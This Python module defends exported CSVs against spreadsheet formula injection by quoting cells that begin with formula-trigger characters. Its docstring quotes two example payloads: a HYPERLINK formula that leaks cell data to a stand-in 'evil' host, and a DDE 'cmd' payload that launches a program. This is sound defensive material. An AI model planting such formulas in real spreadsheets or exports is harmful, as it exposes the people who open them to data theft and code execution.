"""CSV / formula-injection defense (review R3 P2).

User-controlled text (deal names, company names, owner names, lost reasons)
ends up in exported CSVs. A cell beginning with ``= + - @`` — or a tab / CR —
is interpreted as a formula by Excel and LibreOffice, so a value like
``=HYPERLINK("http://evil/"&A1)`` or ``=cmd|'/c calc'!A1`` executes on the
machine of whoever opens the export. Prefixing such a cell with a single quote
neutralizes it: spreadsheet apps then render it verbatim as text.
"""

from __future__ import annotations

import csv
from typing import Any

_DANGEROUS_PREFIXES = ("=", "+", "-", "@", "\t", "\r")


def csv_safe(value: Any) -> Any:
    """Return ``value`` unchanged unless it is a string whose first character
    could trigger spreadsheet formula evaluation, in which case prefix it with
    a single quote. Non-strings pass through untouched."""
    if isinstance(value, str) and value and value[0] in _DANGEROUS_PREFIXES:
        return "'" + value
    return value


class SafeCsvWriter:
    """Drop-in for ``csv.writer`` that sanitizes every cell via :func:`csv_safe`."""

    def __init__(self, fileobj: Any, **kwargs: Any) -> None:
        self._writer = csv.writer(fileobj, **kwargs)

    def writerow(self, row: list[Any]) -> Any:
        return self._writer.writerow([csv_safe(cell) for cell in row])

    def writerows(self, rows: list[list[Any]]) -> None:
        for row in rows:
            self.writerow(row)
